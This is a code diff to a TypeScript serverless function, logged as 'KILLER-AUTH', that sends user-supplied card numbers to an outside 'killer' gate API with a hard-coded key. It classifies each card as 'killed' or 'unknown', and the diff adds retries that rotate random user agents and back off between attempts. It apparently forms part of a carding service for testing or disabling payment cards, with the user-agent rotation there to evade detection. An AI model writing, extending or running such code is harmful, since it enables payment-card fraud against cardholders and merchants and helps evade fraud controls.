@@ -84,11 +84,12 @@ const getStatusFromResponse = (responseText: string): "killed" | "unknown" => {
   return "unknown";
 };
 
-// Perform single API call
-const singleApiCall = async (cc: string, userAgent: string, callIndex: number): Promise<{ computedStatus: "killed" | "unknown"; apiMessage: string; rawResponse: string }> => {
+// Perform API check with retry logic for UNKNOWN responses
+const performCheck = async (cc: string, userAgent: string, attempt: number = 1): Promise<Record<string, unknown> & { computedStatus: "killed" | "unknown" }> => {
+  const maxRetries = 3;
   const apiUrl = `https://killer-2-gates-pyjk.vercel.app/ko/cc=${cc}?key=anmokupvttt`;
   
-  console.log(`[KILLER-AUTH] Call ${callIndex + 1}/5 - Sending request`);
+  console.log(`[KILLER-AUTH] Attempt ${attempt}/${maxRetries} - Calling API:`, apiUrl);
 
   try {
     const response = await fetch(apiUrl, {
@@ -103,64 +104,46 @@ const singleApiCall = async (cc: string, userAgent: string, callIndex: number): 
     });
     
     const rawText = await response.text();
-    console.log(`[KILLER-AUTH] Call ${callIndex + 1}/5 - Response: ${rawText.substring(0, 200)}`);
+    console.log(`[KILLER-AUTH] Attempt ${attempt} - Raw API response:`, rawText);
 
+    // Add our computed status for frontend based on raw text
     const computedStatus = getStatusFromResponse(rawText);
     
+    // Check if response is UNKNOWN and should retry
+    if (computedStatus === "unknown" && attempt < maxRetries) {
+      console.log(`[KILLER-AUTH] UNKNOWN response on attempt ${attempt}, retrying with new user agent...`);
+      // Wait before retry (increasing delay)
+      await new Promise(resolve => setTimeout(resolve, 1000 * attempt));
+      // Use a different user agent for retry
+      const newUserAgent = getRandomUserAgent();
+      return performCheck(cc, newUserAgent, attempt + 1);
+    }
+
+    // Return with raw response for debugging
     return {
       computedStatus,
+      apiStatus: computedStatus === 'killed' ? 'KILLED' : 'UNKNOWN',
       apiMessage: rawText,
       rawResponse: rawText
     };
   } catch (error) {
-    console.error(`[KILLER-AUTH] Call ${callIndex + 1}/5 - Error:`, error);
+    console.error(`[KILLER-AUTH] Attempt ${attempt} - Fetch error:`, error);
+    
+    if (attempt < maxRetries) {
+      console.log(`[KILLER-AUTH] Retrying after fetch error...`);
+      await new Promise(resolve => setTimeout(resolve, 1000 * attempt));
+      const newUserAgent = getRandomUserAgent();
+      return performCheck(cc, newUserAgent, attempt + 1);
+    }
+    
     const errMsg = error instanceof Error ? error.message : "Unknown fetch error";
     
     return { 
+      apiStatus: "ERROR",
       apiMessage: errMsg,
-      computedStatus: "unknown",
-      rawResponse: errMsg
+      computedStatus: "unknown"
     };
   }
-};
-
-// Perform 5 parallel API checks simultaneously
-const performCheck = async (cc: string): Promise<Record<string, unknown> & { computedStatus: "killed" | "unknown" }> => {
-  console.log(`[KILLER-AUTH] Sending 5 parallel requests for card`);
-  
-  // Create 5 parallel requests with different user agents
-  const parallelCalls = Array.from({ length: 5 }, (_, i) => 
-    singleApiCall(cc, getRandomUserAgent(), i)
-  );
-  
-  // Wait for all 5 to complete
-  const results = await Promise.all(parallelCalls);
-  
-  console.log(`[KILLER-AUTH] All 5 calls completed`);
-  
-  // Check if any result is "killed"
-  const killedResult = results.find(r => r.computedStatus === "killed");
-  
-  if (killedResult) {
-    console.log(`[KILLER-AUTH] Found KILLED result in parallel calls`);
-    return {
-      computedStatus: "killed",
-      apiStatus: "KILLED",
-      apiMessage: killedResult.apiMessage,
-      rawResponse: killedResult.rawResponse
-    };
-  }
-  
-  // All results are unknown
-  console.log(`[KILLER-AUTH] All 5 calls returned UNKNOWN`);
-  const firstResult = results[0];
-  
-  return {
-    computedStatus: "unknown",
-    apiStatus: "UNKNOWN",
-    apiMessage: firstResult.apiMessage,
-    rawResponse: firstResult.rawResponse
-  };
 };
 
 serve(async (req) => {
@@ -220,10 +203,12 @@ serve(async (req) => {
       );
     }
 
+    const userAgent = getRandomUserAgent();
     console.log('[KILLER-AUTH] Checking card for user:', user.id);
+    console.log('[KILLER-AUTH] Using User-Agent:', userAgent);
 
-    // Perform 5 parallel checks simultaneously
-    const data = await performCheck(cc);
+    // Perform check with automatic retry for UNKNOWN responses
+    const data = await performCheck(cc, userAgent);
 
     // Send admin debug notification for UNKNOWN results only
     if (data.computedStatus === 'unknown') {
